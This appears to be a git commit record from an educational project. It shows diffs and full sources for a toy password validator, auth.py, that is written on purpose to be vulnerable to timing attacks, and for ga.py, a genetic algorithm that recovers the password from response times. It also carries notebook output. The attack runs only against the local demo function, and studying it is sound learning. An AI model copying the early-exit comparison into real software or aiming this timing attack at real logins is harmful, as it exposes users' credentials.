frJ5MnSyl2UMcupLI0pvA85OTn48ccf8dVXX0knMLXkcv\/222+ws7PD6NGjFS63lLLTbPeEFVFRUbh79y7Onz\/PdVYM7sWLF\/j+++8RHR0NR0dHrrNjVCKRCPXq1cPcuXMBAHXq1MHdu3exZs0aDBw4kOPcGc7OnTuxdetWbNu2DdWqVUNsbCzGjBkDPz8\/iy43kZefn4\/evXuDYRisXr2a6+wY3PXr17Fs2TLcuHEDPB6P6+wYFNUQcaBkyZKwtbWV63WUkpICX19fjnKlu1GjRuHgwYM4ffo0ypQpI33d19cXeXl5SEtLk0lfuJy+vr4K3wfJMlVp3Nzc4OTkxHZx1Lp+\/TpSU1NRt25d2NnZwc7ODmfOnMHy5cthZ2cHHx8fiyw3AJQqVQpVq1aVea1KlSpITEwEUJB3Vce2r68vUlNTZZYLBAK8f\/9eq\/fHmCZMmCCtJapRowb69++PsWPHSmsILbXcRRmznMrScPk+SIKh58+fIzo6Wlo7BFhuuc+dO4fU1FT4+\/tLz3fPnz\/H+PHjERgYCMByyk4BEQccHBwQEhKCkydPSl8TiUQ4efIkQkNDOcyZdhiGwahRo7B3716cOnUKQUFBMstDQkJgb28vU864uDgkJiZKyxkaGoo7d+7IfJkkJxrJhTc0NFRmG5I0XL1Xbdq0wZ07dxAbGyv9qVevHvr16yf92xLLDQBNmjSRG1rh0aNHCAgIAAAEBQXB19dXJt8ZGRm4fPmyTNnT0tJw\/fp1aZpTp05BJBKhYcOG0jRnz55Ffn6+NE10dDQqV66M4sWLG6x8ymRnZ8PGRvZ0aWtrC5FIBMByy12UMctpase\/JBh6\/PgxTpw4gRIlSsgst9Ry9+\/fH7dv35Y53\/n5+WHChAk4duwYAAsqu1GabhM527dvZ\/h8PrNx40bm\/v37zLBhwxgPDw+ZXkembuTIkYy7uzsTExPDJCUlSX+ys7OlaUaMGMH4+\/szp06dYq5du8aEhoYyoaGh0uWS7uft2rVjYmNjmaNHjzJeXl4Ku59PmDCBefDgAbNy5UrOu58XVbiXGcNYbrmvXLnC2NnZMXPmzGEeP37MbN26lXF2dma2bNkiTfPrr78yHh4ezP79+5nbt28zXbp0Udgtu06dOszly5eZ8+fPMxUrVpTpopuWlsb4+Pgw\/fv3Z+7evcts376dcXZ25qzb\/cCBA5nSpUtLu93v2bOHKVmyJDNx4kRpGkspd2ZmJnPz5k3m5s2bDABm8eLFzM2bN6W9qYxVzgsXLjB2dnbMwoULmQcPHjDTp083aBdsVeXOy8tjvvjiC6ZMmTJMbGyszPmucK8pcyy3urIrUrSXGcOYb9kLo4CIQ7\/\/\/jvj7+\/PODg4MA0aNGAuXbrEdZa0AkDhz4YNG6RpPn36xHz77bdM8eLFGWdnZ6Zbt25MUlKSzHYSEhKYDh06ME5OTkzJkiWZ8ePHM\/n5+TJpTp8+zdSuXZtxcHBgypUrJ7MPU1A0ILLkcv\/7779M9erVGT6fzwQHBzNr166VWS4SiZipU6cyPj4+DJ\/PZ9q0acPExcXJpHn37h3z1VdfMa6uroybmxszaNAgJjMzUybNrVu3mKZNmzJ8Pp8pXbo08+uvvxq8bMpkZGQw33\/\/PePv7884Ojoy5cqVY37++WeZi6GllPv06dMKv9cDBw5kGMa45dy5cydTqVIlxsHBgalWrRpz6NAhTsodHx+v9Hx3+vRpsy63urIroiggMteyF8ZjmEJDrRJCCCGEWCFqQ0QIIYQQq0cBESGEEEKsHgVEhBBCCLF6FBARQgghxOpRQEQIIYQQq0cBESGEEEKsHgVEhBBCCLF6FBARQgymZcuWGDNmjMlsx9oFBgZi6dKlXGeDEJNEAREhFigyMhI8Hg88Hg8ODg6oUKECZs2aBYFAwHXWVIqJiQGPx5ObGHfPnj2YPXu2UfLwv\/\/9D61bt0bx4sXh5OSEypUrY\/Dgwbh586ZR9s+GjRs3wsPDQ+71q1evYtiwYcbPECFmgAIiQixU+\/btkZSUhMePH2P8+PGYMWMGFixYwHW2dOLp6YlixYoZfD8\/\/vgj+vTpg9q1a+PAgQOIi4vDtm3bUK5cOUyePNng+1cnLy9Pr\/W9vLzg7OzMUm4IsSwUEBFiofh8Pnx9fREQEICRI0ciLCwMBw4cAAB8+PABAwYMQPHixeHs7IwOHTrg8ePH0nUlNQz79u1DxYoV4ejoiPDwcLx48UKaJjIyEl27dpXZ55gxY9CyZUulefr7779Rr149FCtWDL6+vujbty9SU1MBAAkJCWjVqhUAoHjx4uDxeIiMjAQg\/8hM0\/wfO3YMVapUgaurqzRAVObSpUuYP38+Fi9ejMWLF6NZs2bw9\/dHSEgIpkyZgiNHjsik379\/P+rWrQtHR0eUK1cOM2fOlKmB4\/F4WLduHbp16wZnZ2dUrFhR+v5L3L17Fx06dICrqyt8\/t\/enYZE9b1xAP+O6aTOuJSJqLhQWippqZlL1JSKU6IMBLlkmhZCmaGkWS8sNbE01DZafBFu2CaBydCiLViKe2mkk5ViGg2S2pSjL3I5vxfipWnSrH7\/35+a5wMDc+597rnPPYPycM6duWZmiIyMxODgILd\/48aNiI+PR2JiIpYsWQKxWAwAyM\/Ph7OzMwQCAaysrBAXFwelUglgepYtJiYGnz594mYJ09PTAagvmfX19UEikUAoFMLQ0BAhISEYGBjg9qenp2P16tUoLS2Fra0tjIyMEBYWhpGRkVnHkZA\/FRVEhGgIPT09boYhOjoaLS0tqKysRH19PRhjCAwMxPj4OBc\/NjaGrKwslJSUoK6uDgqFAmFhYb+Vw\/j4ODIzM9He3o6Kigr09vZyRY+VlRVu3rwJAOjq6oJcLseZM2e+289888\/NzUVpaSkeP36Mvr4+JCcnz5rb1atXIRQKERcX9939PB6Pe\/\/kyRNERUUhISEBnZ2dKCgoQFFREbKyslSOycjIQEhICJ4\/f47AwEBERERgeHgYAKBQKODr6wtXV1e0tLTg7t27GBgYQEhIiEofxcXF4PP5qKurw6VLlwAAWlpaOHv2LDo6OlBcXIyHDx8iJSUFAODj44PTp0\/D0NAQcrkccrn8u9c9NTUFiUSC4eFh1NTUoLq6Gj09PQgNDVWJ6+7uRkVFBaRSKaRSKWpqapCdnT3rOBLyx\/rPHiNLCPnP7Ny5k0kkEsbY9NPJq6ur2cKFC1lycjJ79eoVA8Dq6uq4+MHBQaanp8du3LjBGGOssLCQAWANDQ1cjEwmYwBYY2Oj2jlmJCQkMJFIxLVFIhFLSEiYNc\/m5mYGgHsq9sxTtz9+\/KgS93U\/P5P\/mzdvuJjz588zMzOzWXPZvHkzc3FxUdmWl5fHBAIB91IoFIwxxvz8\/Njx48dVYktLS5m5uTnXBsBSU1O5tlKpZADYnTt3GGOMZWZmsoCAAJU++vv7GQDu6fEikYi5urrOmvOM8vJyZmJiwrULCwuZkZGRWtzXTymvqqpiCxYsYH19fdz+jo4OBoA1NTUxxhhLS0tj+vr67PPnz1zMwYMHmaen5w9zIuRPQzNEhPylpFIphEIhdHV1sWXLFoSGhiI9PR0ymQza2trw9PTkYk1MTLBixQrIZDJum7a2Njw8PLi2g4MDjI2NVWJ+VmtrK4KDg2FtbQ0DAwOIRCIA00s38zXf\/PX19bFs2TKubW5uzi3PzdeuXbvQ1taGgoICjI6OgjEGAGhvb8exY8cgFAq5V2xsLORyOcbGxrjjXVxcuPcCgQCGhoZcDu3t7Xj06JFKHw4ODgCmZ2VmuLu7q+V1\/\/59+Pn5wdLSEgYGBoiMjMTQ0JDKuX9EJpPBysoKVlZW3DYnJye1z9jW1lbl\/q1fGUdC\/gTa\/+8ECCH\/G5s2bcLFixfB5\/NhYWEBbe1\/989dS0uLKxBmfL1k9a3R0VGIxWKIxWKUlZXB1NQUfX19EIvFv32z8Pfo6OiotHk8nlq+X7O3t0dtbS3Gx8e5Y42NjWFsbIx3796pxCqVSmRkZGDr1q1q\/ejq6s6Zw9TUFNdHcHAwcnJy1PowNzfn3gsEApV9vb29CAoKwt69e5GVlYXFixejtrYWu3fvxpcvX\/71m6bnugZC\/iY0Q0TIX0ogEMDOzg7W1tYqxZCjoyMmJibQ2NjIbRsaGkJXVxecnJy4bRMTE2hpaeHaXV1dUCgUcHR0BDD9jaVvb1Jua2ubNZ+XL19iaGgI2dnZWL9+PRwcHNRmGvh8PgBgcnJy1n7mm\/\/PCg8Ph1KpxIULF34Y6+bmhq6uLtjZ2am9tLTm92\/Vzc0NHR0dsLW1Vevj2yLoa62trZiamkJeXh68vLywfPlyvH\/\/XiWGz+fPOYbA9Dj29\/er3Cjf2dkJhULxW+NIyJ+KCiJCNIy9vT0kEgliY2NRW1uL9vZ27NixA5aWlpBIJFycjo4O9u\/fj8bGRrS2tiI6OhpeXl5Yu3YtAMDX1xctLS0oKSnB69evkZaWhhcvXsx6Xmtra\/D5fJw7dw49PT2orKxU+20hGxsb8Hg8SKVSfPjwgfvm1K\/k\/7O8vb2RlJSEpKQkHDhwALW1tXj79i0aGhpw+fJl8Hg8rtg5evQoSkpKkJGRgY6ODshkMly7dg2pqanzPt++ffswPDyM8PBwNDc3o7u7G\/fu3UNMTMycxYydnR3Gx8e5cSwtLeVutp5ha2sLpVKJBw8eYHBw8LtLaf7+\/nB2dkZERASePn2KpqYmREVFQSQSYc2aNfO+DkL+FlQQEaKBCgsL4e7ujqCgIHh7e4Mxhtu3b6ssj+jr6+PQoUPYvn071q1bB6FQiOvXr3P7xWIxjhw5gpSUFHh4eGBkZARRUVGzntPU1BRFRUUoLy+Hk5MTsrOzkZubqxJjaWmJjIwMHD58GGZmZoiPj\/\/l\/H9Fbm4urly5gmfPniEoKAj29vbYtm0bpqamUF9fD0NDQ+7apVIpqqqq4OHhAS8vL5w6dQo2NjbzPpeFhQXq6uowOTmJgIAAODs7IzExEcbGxnPOMq1atQr5+fnIycnBypUrUVZWhhMnTqjE+Pj4YM+ePQgNDYWpqSlOnjyp1g+Px8OtW7ewaNEibNiwAf7+\/li6dKnKZ0yIJuGxuRbVCSEaqaioCImJiWq\/GE0IIX8rmiEihBBCiMajgogQQgghGo+WzAghhBCi8WiGiBBCCCEajwoiQgghhGg8KogIIYQQovGoICKEEEKIxqOCiBBCCCEajwoiQgghhGg8KogIIYQQovGoICKEEEKIxqOCiBBCCCEa7x8zH0TaL1E56gAAAABJRU5ErkJggg==\",\n       \"text\/plain\": [\n        \"<Figure size 640x480 with 1 Axes>\"\n       ]\n      },\n      \"metadata\": {},\n      \"output_type\": \"display_data\"\n+    },\n+    {\n+     \"name\": \"stdout\",\n+     \"output_type\": \"stream\",\n+     \"text\": [\n+      \"CPU times: user 36 s, sys: 189 ms, total: 36.2 s\\n\",\n+      \"Wall time: 36 s\\n\"\n+     ]\n     }\n    ],\n    \"source\": [\n     \"from ga import main\\n\",\n     \"\\n\",\n-    \"main()\"\n+    \"args = {\\n\",\n+    \"    \\\"POPULATION_SIZE\\\": 100,\\n\",\n+    \"    \\\"NUMBER_ITERATIONS\\\": 60000,\\n\",\n+    \"    \\\"MUTATION_PCT\\\": 0.5,\\n\",\n+    \"    \\\"BRAKE_ON_SOLUTION\\\": True,\\n\",\n+    \"    \\\"OUTPUT\\\": \\\"ga\\\",\\n\",\n+    \"}\\n\",\n+    \"\\n\",\n+    \"%time main(args=args)\"\n    ]\n   }\n  ],\n","files":{"\/auth.py":{"changes":[{"diff":"\n Simulated Authentication Function\n \"\"\"\n \n-from time import sleep\n-\n-PASSWORD = \"12345678\"\n+PASSWORD = \"0123456789\"\n \n \n def validate(password):","add":1,"remove":3,"filename":"\/auth.py","badparts":["from time import sleep","PASSWORD = \"12345678\""],"goodparts":["PASSWORD = \"0123456789\""]}],"source":"\n\"\"\" Simulated Authentication Function \"\"\" from time import sleep PASSWORD=\"12345678\" def validate(password): \"\"\" This method receives an string as a parameter, compares it to the global PASSWORD constant, and returns True if they match, and False otherwise. It is a very bad implementation of a password, validation function, to make it vulnerable to timing attacks. \"\"\" if len(password) !=len(PASSWORD): return False for i in range(len(PASSWORD)): if PASSWORD[i] !=password[i]: return False return True ","sourceWithComments":"\"\"\"\nSimulated Authentication Function\n\"\"\"\n\nfrom time import sleep\n\nPASSWORD = \"12345678\"\n\n\ndef validate(password):\n    \"\"\"\n    This method receives an string as a parameter,\n    compares it to the global PASSWORD constant,\n    and returns True if they match, and False\n    otherwise.\n\n    It is a very bad implementation of a password,\n    validation function, to make it vulnerable to\n    timing attacks.\n    \"\"\"\n\n    # Return immediately when password length don't match\n    if len(password) != len(PASSWORD):\n        return False\n\n    # Compare password element wise\n    # pylint: disable=consider-using-enumerate\n    for i in range(len(PASSWORD)):\n        if PASSWORD[i] != password[i]:\n            return False\n\n    # If everything is good, then return True\n    return True\n"},"\/ga.py":{"changes":[{"diff":"\n     return parser.parse_args()\n \n \n-POPULATION_SIZE = 100\n-NUMBER_ITERATIONS = 10000\n-MUTATION_PCT = 0.5\n-BRAKE_ON_SOLUTION = False\n-OUTPUT = \"plot\"\n-\n-\n def create_population(population_size: int) -> List[str]:\n     \"\"\"\n     Returns a population of members.\n-    Members are strings of 8 digits.\n-    Allowed digits are 1 to 8.\n+    Members are strings of 10 characters.\n+    Allowed digits are 0 to 9.\n     The string encodes a password\n     candidate.\n     \"\"\"\n-    return [\"\".join(random.choices(\"12345678\", k=8)) for _ in range(population_size)]\n+    return [\n+        \"\".join(random.choices(string.digits, k=10)) for _ in range(population_size)\n+    ]\n \n \n def calculate_fitness(member: str) -> int:\n","add":5,"remove":10,"filename":"\/ga.py","badparts":["POPULATION_SIZE = 100","NUMBER_ITERATIONS = 10000","MUTATION_PCT = 0.5","BRAKE_ON_SOLUTION = False","OUTPUT = \"plot\"","    Members are strings of 8 digits.","    Allowed digits are 1 to 8.","    return [\"\".join(random.choices(\"12345678\", k=8)) for _ in range(population_size)]"],"goodparts":["    Members are strings of 10 characters.","    Allowed digits are 0 to 9.","    return [","        \"\".join(random.choices(string.digits, k=10)) for _ in range(population_size)","    ]"]},{"diff":"\n     A higher average number means our candidate\n     is close to the password.\n     \"\"\"\n-    accumulator = 0\n     iterations = 10\n+    results = []\n     for _ in range(iterations):\n         start = time.time_ns()\n         validate(member)\n         end = time.time_ns()\n-        accumulator += end - start\n+        results.append(end - start)\n \n-    return accumulator \/ iterations\n+    return statistics.median(results)\n \n \n def select_parents(population: List[str]) -> List[str]:\n","add":3,"remove":3,"filename":"\/ga.py","badparts":["    accumulator = 0","        accumulator += end - start","    return accumulator \/ iterations"],"goodparts":["    results = []","        results.append(end - start)","    return statistics.median(results)"]},{"diff":"\n     should_mutate = random.random() > (1 - pct)\n     if should_mutate:\n         index = random.randint(0, len(member) - 1)\n-        target = random.choices(\"12345678\", k=1)[0]\n+        target = random.choices(string.digits, k=1)[0]\n         temp = list(member)\n         temp[index] = target\n         member = \"\".join(temp)\n","add":1,"remove":1,"filename":"\/ga.py","badparts":["        target = random.choices(\"12345678\", k=1)[0]"],"goodparts":["        target = random.choices(string.digits, k=1)[0]"]},{"diff":"\n     return member\n \n \n-def main():\n+def main(args):\n     \"\"\"\n     Main Function.\n \n","add":1,"remove":1,"filename":"\/ga.py","badparts":["def main():"],"goodparts":["def main(args):"]},{"diff":"\n     generation is created based on crossover and\n     mutations operations.\n     \"\"\"\n-    population = create_population(POPULATION_SIZE)\n+    population = create_population(args[\"POPULATION_SIZE\"])\n     solution = None\n     average = []\n     best = []\n","add":1,"remove":1,"filename":"\/ga.py","badparts":["    population = create_population(POPULATION_SIZE)"],"goodparts":["    population = create_population(args[\"POPULATION_SIZE\"])"]},{"diff":"\n         print(f\"Member {member} Fitness {calculate_fitness(member)}\")\n     print(\"\")\n \n-    for _ in range(NUMBER_ITERATIONS):\n+    for _ in range(args[\"NUMBER_ITERATIONS\"]):\n         # Check if any of the candidates in the next\n         # generation is a solution\n         for _, candidate in enumerate(population):\n             if validate(candidate):\n                 solution = candidate\n-                if BRAKE_ON_SOLUTION:\n-                    break\n+\n+        if solution and args[\"BRAKE_ON_SOLUTION\"]:\n+            break\n \n         parents, scores = select_parents(population)\n         average.append(sum(scores) \/ len(scores))\n","add":4,"remove":3,"filename":"\/ga.py","badparts":["    for _ in range(NUMBER_ITERATIONS):","                if BRAKE_ON_SOLUTION:","                    break"],"goodparts":["    for _ in range(args[\"NUMBER_ITERATIONS\"]):","        if solution and args[\"BRAKE_ON_SOLUTION\"]:","            break"]},{"diff":"\n         for i in range(0, len(parents), 2):\n             parent1 = parents[i]\n             parent2 = parents[i + 1]\n-            score1 = scores[i]\n-            score2 = scores[i + 1]\n             offspring1 = do_crossover(parent1=parent1, parent2=parent2)\n-            offspring1 = do_mutation(offspring1, MUTATION_PCT)\n+            offspring1 = do_mutation(offspring1, args[\"MUTATION_PCT\"])\n             next_generation.append(offspring1)\n             offspring2 = do_crossover(parent1=parent2, parent2=parent1)\n-            offspring2 = do_mutation(offspring2, MUTATION_PCT)\n+            offspring2 = do_mutation(offspring2, args[\"MUTATION_PCT\"])\n             next_generation.append(offspring2)\n \n         population = next_generation\n","add":2,"remove":4,"filename":"\/ga.py","badparts":["            score1 = scores[i]","            score2 = scores[i + 1]","            offspring1 = do_mutation(offspring1, MUTATION_PCT)","            offspring2 = do_mutation(offspring2, MUTATION_PCT)"],"goodparts":["            offspring1 = do_mutation(offspring1, args[\"MUTATION_PCT\"])","            offspring2 = do_mutation(offspring2, args[\"MUTATION_PCT\"])"]},{"diff":"\n     plt.title(\"Fitness Over Population Generation\")\n     plt.xlabel(\"Population Generation\")\n     plt.ylabel(\"Fitness\")\n-    plt.savefig(OUTPUT)\n+    plt.savefig(args[\"OUTPUT\"])\n     plt.show(block=True)\n \n \n if __name__ == \"__main__\":\n-    args = parse_args()\n-    POPULATION_SIZE = args.POPULATION_SIZE\n-    NUMBER_ITERATIONS = args.NUMBER_ITERATIONS\n-    MUTATION_PCT = args.MUTATION_PCT\n-    BRAKE_ON_SOLUTION = args.BRAKE_ON_SOLUTION\n-    OUTPUT = args.OUTPUT\n-\n-    main()\n+    cli_args = parse_args()\n+\n+    main(\n+        {\n+            \"POPULATION_SIZE\": cli_args.POPULATION_SIZE,\n+            \"NUMBER_ITERATIONS\": cli_args.NUMBER_ITERATIONS,\n+            \"MUTATION_PCT\": cli_args.MUTATION_PCT,\n+            \"BRAKE_ON_SOLUTION\": cli_args.BRAKE_ON_SOLUTION,\n+            \"OUTPUT\": cli_args.OUTPUT,\n+        }\n+   ","add":12,"remove":9,"filename":"\/ga.py","badparts":["    plt.savefig(OUTPUT)","    args = parse_args()","    POPULATION_SIZE = args.POPULATION_SIZE","    NUMBER_ITERATIONS = args.NUMBER_ITERATIONS","    MUTATION_PCT = args.MUTATION_PCT","    BRAKE_ON_SOLUTION = args.BRAKE_ON_SOLUTION","    OUTPUT = args.OUTPUT","    main()"],"goodparts":["    plt.savefig(args[\"OUTPUT\"])","    cli_args = parse_args()","    main(","        {","            \"POPULATION_SIZE\": cli_args.POPULATION_SIZE,","            \"NUMBER_ITERATIONS\": cli_args.NUMBER_ITERATIONS,","            \"MUTATION_PCT\": cli_args.MUTATION_PCT,","            \"BRAKE_ON_SOLUTION\": cli_args.BRAKE_ON_SOLUTION,","            \"OUTPUT\": cli_args.OUTPUT,","        }"]}],"source":"\n\"\"\" Genetic Algorithm to execute a Timing Attack on a weak password validation method \"\"\" import argparse import random import time from typing import List from matplotlib import pyplot as plt from auth import validate def parse_args(): \"\"\"Parse command line arguments\"\"\" parser=argparse.ArgumentParser() parser.add_argument( \"-p\", \"--population-size\", help=\"Population size\", type=int, default=100, dest=\"POPULATION_SIZE\", ) parser.add_argument( \"-n\", \"--number-iterations\", help=\"Number of Iterations\", type=int, default=10000, dest=\"NUMBER_ITERATIONS\", ) parser.add_argument( \"-m\", \"--mutation-probability\", help=\"Mutation Probability\", type=float, default=0.5, dest=\"MUTATION_PCT\", ) parser.add_argument( \"--brake-on-solution\", help=\"Stop when a solution is found\", type=bool, action=argparse.BooleanOptionalAction, default=False, dest=\"BRAKE_ON_SOLUTION\", ) parser.add_argument( \"-o\", \"--output\", help=\"Output file for plot\", type=str, default=\"plot\", dest=\"OUTPUT\", ) return parser.parse_args() POPULATION_SIZE=100 NUMBER_ITERATIONS=10000 MUTATION_PCT=0.5 BRAKE_ON_SOLUTION=False OUTPUT=\"plot\" def create_population(population_size: int) -> List[str]: \"\"\" Returns a population of members. Members are strings of 8 digits. Allowed digits are 1 to 8. The string encodes a password candidate. \"\"\" return[\"\".join(random.choices(\"12345678\", k=8)) for _ in range(population_size)] def calculate_fitness(member: str) -> int: \"\"\" Returns a member fitness score The fitness score is calculated based on the average time it takes for the authentication method to validate a member of the population. A higher average number means our candidate is close to the password. \"\"\" accumulator=0 iterations=10 for _ in range(iterations): start=time.time_ns() validate(member) end=time.time_ns() accumulator +=end -start return accumulator \/ iterations def select_parents(population: List[str]) -> List[str]: \"\"\" Returns parents for next generation with their fitness scores. Parents are selected from the current population proportional to their fitness score, using a \"normalized fitness calculation\". The method random.choices is used to perform this selection, using the fitness score as the weights. Once the parent for the next generation are chosen, their fitness scores are calculated and returned as well in the result. \"\"\" scores=[] for _, member in enumerate(population): scores.append(calculate_fitness(member)) parents=random.choices(population, weights=scores, k=len(population)) new_scores=[] for _, member in enumerate(parents): new_scores.append(calculate_fitness(member)) return(parents, new_scores) def do_crossover(parent1: str, parent2: str) -> str: \"\"\" Return an offspring that is the result of the crossover of two parents. A random spot is chosen for the crossover. The offspring inherits the initial part of the first parent, and the last part of the second parent. \"\"\" cut=random.randint(1, len(parent1)) return parent1[:cut] +parent2[cut:] def do_mutation(member: str, pct: float=0.8) -> str: \"\"\" Return a mutated version of member. Mutations occur based on a probability passed as a parameter(pct). A high pct makes mutations more frequent. On mutation, a random position in the string is selected to be switched to a random valid character. \"\"\" should_mutate=random.random() >(1 -pct) if should_mutate: index=random.randint(0, len(member) -1) target=random.choices(\"12345678\", k=1)[0] temp=list(member) temp[index]=target member=\"\".join(temp) return member def main(): \"\"\" Main Function. The program starts by creating an initial population. Then, it executes the genetic algorithm for a fixed number of iterations. On each iteration, parents for the next generation are selected, and the new generation is created based on crossover and mutations operations. \"\"\" population=create_population(POPULATION_SIZE) solution=None average=[] best=[] print(\"Initial Population\\n\") for _, member in enumerate(population): print(f\"Member{member} Fitness{calculate_fitness(member)}\") print(\"\") for _ in range(NUMBER_ITERATIONS): for _, candidate in enumerate(population): if validate(candidate): solution=candidate if BRAKE_ON_SOLUTION: break parents, scores=select_parents(population) average.append(sum(scores) \/ len(scores)) best.append(max(scores)) next_generation=[] for i in range(0, len(parents), 2): parent1=parents[i] parent2=parents[i +1] score1=scores[i] score2=scores[i +1] offspring1=do_crossover(parent1=parent1, parent2=parent2) offspring1=do_mutation(offspring1, MUTATION_PCT) next_generation.append(offspring1) offspring2=do_crossover(parent1=parent2, parent2=parent1) offspring2=do_mutation(offspring2, MUTATION_PCT) next_generation.append(offspring2) population=next_generation if solution: print(\"Solution Found\\n\") print(f\"Member{solution} Fitness{calculate_fitness(solution)}\") print(\"\") print(\"Final Population\\n\") for _, member in enumerate(population): print(f\"Member{member} Fitness{calculate_fitness(member)}\") plt.plot(average) plt.plot(best) plt.legend([\"Average Fitness\", \"Best Fitness\"]) plt.title(\"Fitness Over Population Generation\") plt.xlabel(\"Population Generation\") plt.ylabel(\"Fitness\") plt.savefig(OUTPUT) plt.show(block=True) if __name__==\"__main__\": args=parse_args() POPULATION_SIZE=args.POPULATION_SIZE NUMBER_ITERATIONS=args.NUMBER_ITERATIONS MUTATION_PCT=args.MUTATION_PCT BRAKE_ON_SOLUTION=args.BRAKE_ON_SOLUTION OUTPUT=args.OUTPUT main() ","sourceWithComments":"\"\"\"\nGenetic Algorithm to execute a Timing Attack \non a weak password validation method\n\"\"\"\n\nimport argparse\nimport random\nimport time\nfrom typing import List\n\nfrom matplotlib import pyplot as plt\n\nfrom auth import validate\n\n\ndef parse_args():\n    \"\"\"Parse command line arguments\"\"\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"-p\",\n        \"--population-size\",\n        help=\"Population size\",\n        type=int,\n        default=100,\n        dest=\"POPULATION_SIZE\",\n    )\n    parser.add_argument(\n        \"-n\",\n        \"--number-iterations\",\n        help=\"Number of Iterations\",\n        type=int,\n        default=10000,\n        dest=\"NUMBER_ITERATIONS\",\n    )\n    parser.add_argument(\n        \"-m\",\n        \"--mutation-probability\",\n        help=\"Mutation Probability\",\n        type=float,\n        default=0.5,\n        dest=\"MUTATION_PCT\",\n    )\n    parser.add_argument(\n        \"--brake-on-solution\",\n        help=\"Stop when a solution is found\",\n        type=bool,\n        action=argparse.BooleanOptionalAction,\n        default=False,\n        dest=\"BRAKE_ON_SOLUTION\",\n    )\n    parser.add_argument(\n        \"-o\",\n        \"--output\",\n        help=\"Output file for plot\",\n        type=str,\n        default=\"plot\",\n        dest=\"OUTPUT\",\n    )\n\n    return parser.parse_args()\n\n\nPOPULATION_SIZE = 100\nNUMBER_ITERATIONS = 10000\nMUTATION_PCT = 0.5\nBRAKE_ON_SOLUTION = False\nOUTPUT = \"plot\"\n\n\ndef create_population(population_size: int) -> List[str]:\n    \"\"\"\n    Returns a population of members.\n    Members are strings of 8 digits.\n    Allowed digits are 1 to 8.\n    The string encodes a password\n    candidate.\n    \"\"\"\n    return [\"\".join(random.choices(\"12345678\", k=8)) for _ in range(population_size)]\n\n\ndef calculate_fitness(member: str) -> int:\n    \"\"\"\n    Returns a member fitness score\n    The fitness score is calculated based on\n    the average time it takes for the\n    authentication method to validate a member\n    of the population.\n\n    A higher average number means our candidate\n    is close to the password.\n    \"\"\"\n    accumulator = 0\n    iterations = 10\n    for _ in range(iterations):\n        start = time.time_ns()\n        validate(member)\n        end = time.time_ns()\n        accumulator += end - start\n\n    return accumulator \/ iterations\n\n\ndef select_parents(population: List[str]) -> List[str]:\n    \"\"\"\n    Returns parents for next generation with\n    their fitness scores.\n    Parents are selected from the current\n    population proportional to their\n    fitness score, using a \"normalized\n    fitness calculation\".\n    The method random.choices is used to\n    perform this selection, using the fitness\n    score as the weights.\n    Once the parent for the next generation\n    are chosen, their fitness scores are\n    calculated and returned as well in the\n    result.\n    \"\"\"\n    scores = []\n    for _, member in enumerate(population):\n        scores.append(calculate_fitness(member))\n    parents = random.choices(population, weights=scores, k=len(population))\n    new_scores = []\n    for _, member in enumerate(parents):\n        new_scores.append(calculate_fitness(member))\n    return (parents, new_scores)\n\n\ndef do_crossover(parent1: str, parent2: str) -> str:\n    \"\"\"\n    Return an offspring that is the result\n    of the crossover of two parents.\n    A random spot is chosen for the crossover.\n    The offspring inherits the initial part of\n    the first parent, and the last part of the\n    second parent.\n    \"\"\"\n    cut = random.randint(1, len(parent1))\n    return parent1[:cut] + parent2[cut:]\n\n\ndef do_mutation(member: str, pct: float = 0.8) -> str:\n    \"\"\"\n    Return a mutated version of member.\n    Mutations occur based on a probability\n    passed as a parameter (pct).\n    A high pct makes mutations more frequent.\n    On mutation, a random position in the\n    string is selected to be switched to a\n    random valid character.\n    \"\"\"\n    should_mutate = random.random() > (1 - pct)\n    if should_mutate:\n        index = random.randint(0, len(member) - 1)\n        target = random.choices(\"12345678\", k=1)[0]\n        temp = list(member)\n        temp[index] = target\n        member = \"\".join(temp)\n\n    return member\n\n\ndef main():\n    \"\"\"\n    Main Function.\n\n    The program starts by creating an initial population.\n    Then, it executes the genetic algorithm for a fixed\n    number of iterations. On each iteration, parents\n    for the next generation are selected, and the new\n    generation is created based on crossover and\n    mutations operations.\n    \"\"\"\n    population = create_population(POPULATION_SIZE)\n    solution = None\n    average = []\n    best = []\n\n    print(\"Initial Population\\n\")\n    for _, member in enumerate(population):\n        print(f\"Member {member} Fitness {calculate_fitness(member)}\")\n    print(\"\")\n\n    for _ in range(NUMBER_ITERATIONS):\n        # Check if any of the candidates in the next\n        # generation is a solution\n        for _, candidate in enumerate(population):\n            if validate(candidate):\n                solution = candidate\n                if BRAKE_ON_SOLUTION:\n                    break\n\n        parents, scores = select_parents(population)\n        average.append(sum(scores) \/ len(scores))\n        best.append(max(scores))\n        next_generation = []\n\n        for i in range(0, len(parents), 2):\n            parent1 = parents[i]\n            parent2 = parents[i + 1]\n            score1 = scores[i]\n            score2 = scores[i + 1]\n            offspring1 = do_crossover(parent1=parent1, parent2=parent2)\n            offspring1 = do_mutation(offspring1, MUTATION_PCT)\n            next_generation.append(offspring1)\n            offspring2 = do_crossover(parent1=parent2, parent2=parent1)\n            offspring2 = do_mutation(offspring2, MUTATION_PCT)\n            next_generation.append(offspring2)\n\n        population = next_generation\n\n    if solution:\n        print(\"Solution Found\\n\")\n        print(f\"Member {solution} Fitness {calculate_fitness(solution)}\")\n        print(\"\")\n\n    print(\"Final Population\\n\")\n    for _, member in enumerate(population):\n        print(f\"Member {member} Fitness {calculate_fitness(member)}\")\n\n    plt.plot(average)\n    plt.plot(best)\n    plt.legend([\"Average Fitness\", \"Best Fitness\"])\n    plt.title(\"Fitness Over Population Generation\")\n    plt.xlabel(\"Population Generation\")\n    plt.ylabel(\"Fitness\")\n    plt.savefig(OUTPUT)\n    plt.show(block=True)\n\n\nif __name__ == \"__main__\":\n    args = parse_args()\n    POPULATION_SIZE = args.POPULATION_SIZE\n    NUMBER_ITERATIONS = args.NUMBER_ITERATIONS\n    MUTATION_PCT = args.MUTATION_PCT\n    BRAKE_ON_SOLUTION = args.BRAKE_ON_SOLUTION\n    OUTPUT = args.OUTPUT\n\n    main()\n"}},"msg":"Update genetic algorithm and auth\n\n* Increase password complexity to 10\n  digits\n* Add brute force implementation for\n  baseline comparison\n* Use median of timing variable instead\n  of average. This improves the accuracy\n  of the fitness scores.\n* Refactor ga to take arguments from\n  notebook\n* Update notebook with partial 